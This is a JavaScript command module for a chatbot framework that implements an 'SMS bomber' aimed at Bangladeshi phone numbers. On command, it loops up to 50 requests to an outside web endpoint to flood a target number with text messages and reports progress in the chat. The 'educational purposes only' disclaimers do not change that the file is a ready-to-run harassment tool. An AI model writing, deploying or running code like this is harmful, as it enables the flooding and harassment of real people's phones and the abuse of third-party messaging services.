const axios = require("axios");

// Store bombing status per thread
const activeBombings = new Map();

module.exports = {
  config: {
    name: "sms",
    aliases: ["bombsms"],
    version: "3.1.0",
    author: "𝐴𝑠𝑖𝑓 𝑀𝑎ℎ𝑚𝑢𝑑",
    role: 0,
    category: "utility",
    shortDescription: {
      en: "📱 𝑆𝑀𝑆 𝑏𝑜𝑚𝑏𝑒𝑟 𝑡𝑜𝑜𝑙 𝑓𝑜𝑟 𝑒𝑑𝑢𝑐𝑎𝑡𝑖𝑜𝑛𝑎𝑙 𝑝𝑢𝑟𝑝𝑜𝑠𝑒𝑠"
    },
    longDescription: {
      en: "𝐸𝑑𝑢𝑐𝑎𝑡𝑖𝑜𝑛𝑎𝑙 𝑆𝑀𝑆 𝑏𝑜𝑚𝑏𝑖𝑛𝑔 𝑡𝑜𝑜𝑙 𝑓𝑜𝑟 𝐵𝑎𝑛𝑔𝑙𝑎𝑑𝑒𝑠ℎ𝑖 𝑝ℎ𝑜𝑛𝑒 𝑛𝑢𝑚𝑏𝑒𝑟𝑠"
    },
    guide: {
      en: "{p}sms [𝑝ℎ𝑜𝑛𝑒 𝑛𝑢𝑚𝑏𝑒𝑟 | 𝑜𝑓𝑓]"
    },
    countDown: 5,
    dependencies: { 
      "axios": "" 
    }
  },

  onStart: async function ({ api, event, args, message }) {
    const { threadID, messageID } = event;
    const input = args[0]?.toLowerCase();

    try {
      // Show help if no arguments
      if (!input) {
        return this.showUsage(message);
      }

      // Handle stop command
      if (input === "off") {
        return this.stopBombing(api, threadID, messageID);
      }

      // Validate Bangladeshi number format
      if (!/^01[3-9]\d{8}$/.test(input)) {
        return message.reply(
          `❌ 𝐼𝑛𝑣𝑎𝑙𝑖𝑑 𝐵𝑎𝑛𝑔𝑙𝑎𝑑𝑒𝑠ℎ𝑖 𝑛𝑢𝑚𝑏𝑒𝑟 𝑓𝑜𝑟𝑚𝑎𝑡!\n` +
          `💡 𝑉𝑎𝑙𝑖𝑑 𝑓𝑜𝑟𝑚𝑎𝑡𝑠: 013XXXXXXXX - 019XXXXXXXX\n` +
          `📝 𝐸𝑥𝑎𝑚𝑝𝑙𝑒: /𝑠𝑚𝑠 01712345678`
        );
      }

      // Check if bombing is already active
      if (activeBombings.has(threadID)) {
        return message.reply(
          "⚠️ 𝑆𝑀𝑆 𝑏𝑜𝑚𝑏𝑖𝑛𝑔 𝑖𝑠 𝑎𝑙𝑟𝑒𝑎𝑑𝑦 𝑎𝑐𝑡𝑖𝑣𝑒 𝑖𝑛 𝑡ℎ𝑖𝑠 𝑡ℎ𝑟𝑒𝑎𝑑!\n" +
          "🛑 𝑆𝑡𝑜𝑝 𝑤𝑖𝑡ℎ: /𝑠𝑚𝑠 𝑜𝑓𝑓"
        );
      }

      // Start bombing
      activeBombings.set(threadID, {
        number: input,
        count: 0,
        startTime: Date.now()
      });
      
      message.reply(
        `🚀 𝑆𝑀𝑆 𝑏𝑜𝑚𝑏𝑖𝑛𝑔 𝑠𝑡𝑎𝑟𝑡𝑒𝑑 𝑓𝑜𝑟: ${input}\n` +
        `⏱️ 𝑇𝑜 𝑠𝑡𝑜𝑝: /𝑠𝑚𝑠 𝑜𝑓𝑓\n\n` +
        `⚠️ 𝑁𝑜𝑡𝑒: 𝑇ℎ𝑖𝑠 𝑖𝑠 𝑓𝑜𝑟 𝑒𝑑𝑢𝑐𝑎𝑡𝑖𝑜𝑛𝑎𝑙 𝑝𝑢𝑟𝑝𝑜𝑠𝑒𝑠 𝑜𝑛𝑙𝑦!`
      );

      // Start bombing in background
      this.startBombing(api, threadID, input);
      
    } catch (error) {
      console.error("SMS Command Error:", error);
      activeBombings.delete(threadID);
      message.reply("❌ 𝐴𝑛 𝑒𝑟𝑟𝑜𝑟 𝑜𝑐𝑐𝑢𝑟𝑟𝑒𝑑! 𝐵𝑜𝑚𝑏𝑖𝑛𝑔 𝑠𝑡𝑜𝑝𝑝𝑒𝑑.");
    }
  },

  stopBombing: function (api, threadID, messageID) {
    if (activeBombings.has(threadID)) {
      const { number, count } = activeBombings.get(threadID);
      activeBombings.delete(threadID);
      api.sendMessage(
        `🛑 𝑆𝑀𝑆 𝑏𝑜𝑚𝑏𝑖𝑛𝑔 𝑠𝑡𝑜𝑝𝑝𝑒𝑑 𝑓𝑜𝑟: ${number}\n` +
        `📊 𝑇𝑜𝑡𝑎𝑙 𝑆𝑀𝑆 𝑠𝑒𝑛𝑡: ${count}`,
        threadID, messageID
      );
    } else {
      api.sendMessage("ℹ️ 𝑁𝑜 𝑎𝑐𝑡𝑖𝑣𝑒 𝑏𝑜𝑚𝑏𝑖𝑛𝑔 𝑖𝑛 𝑡ℎ𝑖𝑠 𝑡ℎ𝑟𝑒𝑎𝑑.", threadID, messageID);
    }
  },

  showUsage: function (message) {
    const usageMessage = `📱 𝑆𝑀𝑆 𝐵𝑜𝑚𝑏𝑒𝑟 𝐶𝑜𝑚𝑚𝑎𝑛𝑑 (𝐸𝑑𝑢𝑐𝑎𝑡𝑖𝑜𝑛𝑎𝑙 𝑈𝑠𝑒 𝑂𝑛𝑙𝑦)

🔧 𝑈𝑠𝑎𝑔𝑒:
/𝑠𝑚𝑠 [𝑝ℎ𝑜𝑛𝑒 𝑛𝑢𝑚𝑏𝑒𝑟]  - 𝑆𝑡𝑎𝑟𝑡 𝑏𝑜𝑚𝑏𝑖𝑛𝑔 (𝐵𝑎𝑛𝑔𝑙𝑎𝑑𝑒𝑠ℎ𝑖 𝑛𝑢𝑚𝑏𝑒𝑟𝑠)
/𝑠𝑚𝑠 𝑜𝑓𝑓             - 𝑆𝑡𝑜𝑝 𝑎𝑐𝑡𝑖𝑣𝑒 𝑏𝑜𝑚𝑏𝑖𝑛𝑔

📝 𝑉𝑎𝑙𝑖𝑑 𝑁𝑢𝑚𝑏𝑒𝑟 𝐸𝑥𝑎𝑚𝑝𝑙𝑒𝑠:
/𝑠𝑚𝑠 01712345678
/𝑠𝑚𝑠 01876543210
/𝑠𝑚𝑠 01911223344

⚠️ 𝐼𝑚𝑝𝑜𝑟𝑡𝑎𝑛𝑡:
1. 𝐹𝑜𝑟 𝑒𝑑𝑢𝑐𝑎𝑡𝑖𝑜𝑛𝑎𝑙 𝑝𝑢𝑟𝑝𝑜𝑠𝑒𝑠 𝑜𝑛𝑙𝑦
2. 𝑅𝑒𝑠𝑝𝑒𝑐𝑡 𝑝𝑟𝑖𝑣𝑎𝑐𝑦 𝑎𝑛𝑑 𝑙𝑜𝑐𝑎𝑙 𝑙𝑎𝑤𝑠
3. 𝑈𝑠𝑒 𝑟𝑒𝑠𝑝𝑜𝑛𝑠𝑖𝑏𝑙𝑦
4. 𝐷𝑜 𝑛𝑜𝑡 𝑎𝑏𝑢𝑠𝑒 𝑡ℎ𝑖𝑠 𝑓𝑒𝑎𝑡𝑢𝑟𝑒
5. 𝑀𝑎𝑥𝑖𝑚𝑢𝑚 50 𝑆𝑀𝑆 𝑝𝑒𝑟 𝑠𝑒𝑠𝑠𝑖𝑜𝑛`;

    message.reply(usageMessage);
  },

  startBombing: async function (api, threadID, number) {
    try {
      const MAX_REQUESTS = 50; // Safety limit
      const REQUEST_DELAY = 2500; // 2.5 seconds
      
      while (activeBombings.has(threadID)) {
        const bombingInfo = activeBombings.get(threadID);
        
        // Safety limit check
        if (bombingInfo.count >= MAX_REQUESTS) {
          this.stopBombing(api, threadID);
          api.sendMessage(
            `🛑 𝐴𝑢𝑡𝑜-𝑠𝑡𝑜𝑝𝑝𝑒𝑑 𝑎𝑓𝑡𝑒𝑟 ${MAX_REQUESTS} 𝑆𝑀𝑆\n` +
            `⚠️ 𝑆𝑎𝑓𝑒𝑡𝑦 𝑙𝑖𝑚𝑖𝑡 𝑟𝑒𝑎𝑐ℎ𝑒𝑑!`,
            threadID
          );
          return;
        }

        try {
          // Send SMS request
          await axios.get(`https://ultranetrn.com.br/fonts/api.php?number=${number}`, {
            timeout: 5000
          });
          
          // Update count
          bombingInfo.count++;
          activeBombings.set(threadID, bombingInfo);
          
          // Update every 5 requests
          if (bombingInfo.count % 5 === 0) {
            api.sendMessage(
              `📶 𝑆𝑒𝑛𝑡 ${bombingInfo.count} 𝑆𝑀𝑆 𝑡𝑜 ${number}\n` +
              `🛑 𝑆𝑡𝑜𝑝 𝑤𝑖𝑡ℎ: /𝑠𝑚𝑠 𝑜𝑓𝑓`,
              threadID
            );
          }
          
          // Add delay
          await new Promise(resolve => setTimeout(resolve, REQUEST_DELAY));
          
        } catch (requestError) {
          console.error("Request failed:", requestError.message);
          // Continue trying unless specifically stopped
        }
      }
      
    } catch (error) {
      console.error("Bombing Error:", error);
      if (activeBombings.has(threadID)) {
        activeBombings.delete(threadID);
        api.sendMessage(
          `❌ 𝐶𝑟𝑖𝑡𝑖𝑐𝑎𝑙 𝑒𝑟𝑟𝑜𝑟: ${error.message}\n𝐵𝑜𝑚𝑏𝑖𝑛𝑔 𝑠𝑡𝑜𝑝𝑝𝑒𝑑!`,
          threadID
        );
      }
    }
  }
};
